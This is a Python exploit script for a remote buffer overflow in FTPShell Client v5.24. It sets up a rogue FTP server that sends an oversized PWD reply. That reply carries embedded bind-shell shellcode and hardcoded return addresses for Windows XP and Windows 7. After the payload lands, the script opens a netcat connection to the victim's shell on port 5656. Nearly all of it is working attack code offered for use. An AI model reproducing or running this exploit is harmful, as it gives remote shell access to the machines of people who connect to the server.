# -*- coding: utf-8 -*-

# Exploit Title: FTPShell Client v5.24 PWD Remote Buffer Overflow
# Date: 16/11/2016
# Author: Yunus YILDIRIM (Th3GundY)
# Team: CT-Zer0 (@CRYPTTECH) - http://www.ct-zer0.com
# Author Website: http://yildirimyunus.com
# Contact: yunusyildirim@protonmail.com
# Software Link: http://www.ftpshell.com/downloadclient.htm
# Tested on: Windows XP Professional SP 2
# Tested on: Windows 7 Ultimate 32bit, Home Premium 64bit

import socket
import sys
import os
import time


def banner():
    banner = "\n\n"
    banner += "  ██████╗████████╗  ███████╗███████╗██████╗  ██████╗     \n"
    banner += " ██╔════╝╚══██╔══╝  ╚══███╔╝██╔════╝██╔══██╗██╔═████╗    \n"
    banner += " ██║        ██║█████╗ ███╔╝ █████╗  ██████╔╝██║██╔██║    \n"
    banner += " ██║        ██║╚════╝███╔╝  ██╔══╝  ██╔══██╗████╔╝██║    \n"
    banner += " ╚██████╗   ██║     ███████╗███████╗██║  ██║╚██████╔╝    \n"
    banner += "  ╚═════╝   ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     \n"
    banner += "                                          \n"
    print banner


def usage():
    banner()
    print "[-] Missing arguments\n"
    print "[*] Usage: python FTPShell-exploit.py target_os"
    print "[*] Target types:\n\tWindows XP -> winxp\n\tWindows 7-32bit -> win7_32\n\tWindows 7-64bit -> win7_64\n"
    sys.exit(0)


def exploit(target_eip):
    s0ck3t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s0ck3t.bind(("0.0.0.0", 21))
    s0ck3t.listen(5)
    print "[*] CT-Zer0 Evil FTP Server Listening port 21\n"

    # \x00\x0a\x0d\x22\xff
    # msfvenom -p windows/shell_bind_tcp LPORT=5656 -f c -b '\x00\x0a\x0d\x22\xff'
    shellcode = ("\xbb\x61\xad\x84\xdf\xda\xcc\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
                 "\x53\x31\x5a\x12\x83\xc2\x04\x03\x3b\xa3\x66\x2a\x47\x53\xe4"
                 "\xd5\xb7\xa4\x89\x5c\x52\x95\x89\x3b\x17\x86\x39\x4f\x75\x2b"
                 "\xb1\x1d\x6d\xb8\xb7\x89\x82\x09\x7d\xec\xad\x8a\x2e\xcc\xac"
                 "\x08\x2d\x01\x0e\x30\xfe\x54\x4f\x75\xe3\x95\x1d\x2e\x6f\x0b"
                 "\xb1\x5b\x25\x90\x3a\x17\xab\x90\xdf\xe0\xca\xb1\x4e\x7a\x95"
                 "\x11\x71\xaf\xad\x1b\x69\xac\x88\xd2\x02\x06\x66\xe5\xc2\x56"
                 "\x87\x4a\x2b\x57\x7a\x92\x6c\x50\x65\xe1\x84\xa2\x18\xf2\x53"
                 "\xd8\xc6\x77\x47\x7a\x8c\x20\xa3\x7a\x41\xb6\x20\x70\x2e\xbc"
                 "\x6e\x95\xb1\x11\x05\xa1\x3a\x94\xc9\x23\x78\xb3\xcd\x68\xda"
                 "\xda\x54\xd5\x8d\xe3\x86\xb6\x72\x46\xcd\x5b\x66\xfb\x8c\x33"
                 "\x4b\x36\x2e\xc4\xc3\x41\x5d\xf6\x4c\xfa\xc9\xba\x05\x24\x0e"
                 "\xbc\x3f\x90\x80\x43\xc0\xe1\x89\x87\x94\xb1\xa1\x2e\x95\x59"
                 "\x31\xce\x40\xf7\x39\x69\x3b\xea\xc4\xc9\xeb\xaa\x66\xa2\xe1"
                 "\x24\x59\xd2\x09\xef\xf2\x7b\xf4\x10\xea\x63\x71\xf6\x78\x84"
                 "\xd7\xa0\x14\x66\x0c\x79\x83\x99\x66\xd1\x23\xd1\x60\xe6\x4c"
                 "\xe2\xa6\x40\xda\x69\xa5\x54\xfb\x6d\xe0\xfc\x6c\xf9\x7e\x6d"
                 "\xdf\x9b\x7f\xa4\xb7\x38\xed\x23\x47\x36\x0e\xfc\x10\x1f\xe0"
                 "\xf5\xf4\x8d\x5b\xac\xea\x4f\x3d\x97\xae\x8b\xfe\x16\x2f\x59"
                 "\xba\x3c\x3f\xa7\x43\x79\x6b\x77\x12\xd7\xc5\x31\xcc\x99\xbf"
                 "\xeb\xa3\x73\x57\x6d\x88\x43\x21\x72\xc5\x35\xcd\xc3\xb0\x03"
                 "\xf2\xec\x54\x84\x8b\x10\xc5\x6b\x46\x91\xf5\x21\xca\xb0\x9d"
                 "\xef\x9f\x80\xc3\x0f\x4a\xc6\xfd\x93\x7e\xb7\xf9\x8c\x0b\xb2"
                 "\x46\x0b\xe0\xce\xd7\xfe\x06\x7c\xd7\x2a")

    buffer = "A" * 400 + target_eip + "\x90" * 40 + shellcode

    while True:
        victim, addr = s0ck3t.accept()
        victim.send("220 CT-Zer0 Evil FTP Service\r\n")
        print "[*] Connection accepted from %s\n" % addr[0]
        while True:
            data = victim.recv(1024)
            if "USER" in data:
                victim.send("331 User name okay, need password\r\n\r\n")
                print "\t[+] 331 USER = %s" % data.split(" ")[1],
            elif "PASS" in data:
                victim.send("230 Password accepted.\r\n230 User logged in.\r\n")
                print "\t[+] 230 PASS = %s" % data.split(" ")[1],
            elif "PWD" in data:
                victim.send('257 "' + buffer + '" is current directory\r\n')
                print "\t[+] 257 PWD"
                print "\n[*] Exploit Sent Successfully\n"
                time.sleep(2)
                print '[+] You got bind shell on port 5656\n'
                os.system('nc ' + str(addr[0]) + ' 5656')


if len(sys.argv) != 2:
    usage()
else:
    banner()
    try:
        if sys.argv[1] == "winxp":
            # 7C80C75B  JMP EBP kernel32.dll
            target_eip = "\x5B\xC7\x80\x7C"
        elif sys.argv[1] == "win7_32":
            # 76ad0299 jmp ebp  [kernel32.dll]
            target_eip = "\x99\x02\xAD\x76"
        elif sys.argv[1] == "win7_64":
            # 7619dfce jmp ebp  [kernel32.dll]
            target_eip = "\xCE\xDF\x19\x76"
        else:
            usage()
        exploit(target_eip)
    except:
        print "\n[O_o]  KTHXBYE!  [O_o]"